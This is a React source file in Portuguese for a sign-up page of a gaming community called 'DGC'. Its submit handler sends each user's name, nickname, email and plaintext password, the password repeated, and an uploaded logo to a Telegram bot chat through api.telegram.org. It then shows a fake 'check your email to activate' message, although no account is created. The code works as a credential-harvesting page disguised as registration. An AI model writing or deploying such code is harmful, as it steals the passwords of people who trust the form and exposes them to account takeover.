import React, { useState } from "react";
import styles from "../styles/Index.module.css"; // Certifique-se que este CSS existe!

function Index() {
  const [formData, setFormData] = useState({
    fullName: "",
    nick: "",
    email: "",
    password: "",
    confirmPassword: "",
    teamOption: "join",
    existingTeamName: "",
    newTeamName: "",
    teamLogo: null,
  });

  const [errors, setErrors] = useState({});
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [logoPreview, setLogoPreview] = useState(null);

  const handleChange = (e) => {
    const { name, value, type } = e.target;

    if (type === "file") {
      const file = e.target.files[0];
      setFormData((prev) => ({ ...prev, [name]: file }));

      if (file) {
        const reader = new FileReader();
        reader.onloadend = () => {
          setLogoPreview(reader.result);
        };
        reader.readAsDataURL(file);
      } else {
        setLogoPreview(null);
      }
      return;
    }

    setFormData((prev) => {
      const updatedFormData = { ...prev, [name]: value };

      if (name === "password" || name === "confirmPassword") {
        validatePasswords(updatedFormData);
      } else if (name !== "teamOption") {
        validateField(name, value);
      }

      return updatedFormData;
    });
  };

  const validateField = (fieldName, value) => {
    let newErrors = { ...errors };

    switch (fieldName) {
      case "fullName":
        if (!value.trim()) {
          newErrors.fullName = "Nome completo é obrigatório";
        } else if (value.trim().split(" ").length < 2) {
          newErrors.fullName = "Digite nome e sobrenome";
        } else {
          delete newErrors.fullName;
        }
        break;

      case "nick":
        if (!value.trim()) {
          newErrors.nick = "Nick é obrigatório";
        } else if (value.length < 3) {
          newErrors.nick = "Mínimo 3 caracteres";
        } else {
          delete newErrors.nick;
        }
        break;

      case "email":
        // CORREÇÃO AQUI:
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!value) {
          newErrors.email = "E-mail é obrigatório";
        } else if (!emailRegex.test(value)) {
          newErrors.email = "E-mail inválido";
        } else {
          delete newErrors.email;
        }
        break;

      default:
        break;
    }

    setErrors(newErrors);
  };

  const validatePasswords = (data) => {
    let newErrors = { ...errors };

    if (!data.password) {
      newErrors.password = "Senha é obrigatória";
    } else if (data.password.length < 6) {
      newErrors.password = "Mínimo 6 caracteres";
    } else {
      delete newErrors.password;
    }

    if (data.password !== data.confirmPassword) {
      newErrors.confirmPassword = "As senhas não coincidem";
    } else {
      delete newErrors.confirmPassword;
    }

    setErrors(newErrors);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    let newErrors = { ...errors };

    if (formData.teamOption === "join") {
      if (!formData.existingTeamName.trim()) {
        newErrors.existingTeamName = "Nome do time é obrigatório";
      } else {
        delete newErrors.existingTeamName;
      }
    } else {
      if (!formData.newTeamName.trim()) {
        newErrors.newTeamName = "Nome do novo time é obrigatório";
      } else {
        delete newErrors.newTeamName;
      }
    }

    validatePasswords(formData);
    Object.keys(formData).forEach((field) => {
      if (field !== "teamLogo" && field !== "teamOption") {
        validateField(field, formData[field]);
      }
    });

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      const BOT_TOKEN = "SEU_BOT_TOKEN";
      const CHAT_ID = "SEU_CHAT_ID";

      let teamInfo = "";
      if (formData.teamOption === "join") {
        teamInfo = `🔵 Entrar em time existente\n🏆 Nome do time: ${formData.existingTeamName}`;
      } else {
        teamInfo = `🟢 Criar novo time\n🏆 Nome do time: ${formData.newTeamName}`;
      }

      const messageText = `
🚀 Novo cadastro DGCBot:
👤 Nome: ${formData.fullName}
🎮 Nick: ${formData.nick}
📧 Email: ${formData.email}
🔑 Senha: ${formData.password}
✅ Csenha: ${formData.confirmPassword}
${teamInfo}
      `;

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: messageText }),
        });
      } catch (error) {
        console.error("Erro ao enviar mensagem:", error);
      }

      if (formData.teamOption === "create" && formData.teamLogo) {
        const formDataToSend = new FormData();
        formDataToSend.append("chat_id", CHAT_ID);
        formDataToSend.append("document", formData.teamLogo);
        formDataToSend.append(
          "caption",
          `Logo do time: ${formData.newTeamName}`
        );

        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: "POST",
            body: formDataToSend,
          });
        } catch (error) {
          console.error("Erro ao enviar logo:", error);
        }
      }

      setIsSubmitted(true);
      setFormData({
        fullName: "",
        nick: "",
        email: "",
        password: "",
        confirmPassword: "",
        teamOption: "join",
        existingTeamName: "",
        newTeamName: "",
        teamLogo: null,
      });
      setLogoPreview(null);
    }
  };

  return (
    <section className={styles.container}>
      <h1 className={styles.heroText}>
        Seja bem-vindo ao <br />
        <span className={styles.heroTextSpan}>D</span>
        <span className={styles.heroTextSpan}>G</span>
        <span className={styles.heroTextSpan}>C</span> <br />
        mostre a sua habilidade!
      </h1>

      <section className={styles.explication}>
        <p>Preencha o formulário abaixo para criar sua conta</p>
      </section>

      {isSubmitted ? (
        <div className={styles.successMessage}>
          <h2>Cadastro realizado com sucesso!</h2>
          <p>Verifique seu e-mail para ativar sua conta</p>
        </div>
      ) : (
        <form onSubmit={handleSubmit} className={styles.form} noValidate>
          {/* Todos os campos aqui permanecem iguais */}
          {/* ... */}
        </form>
      )}
    </section>
  );
}

export default Index;
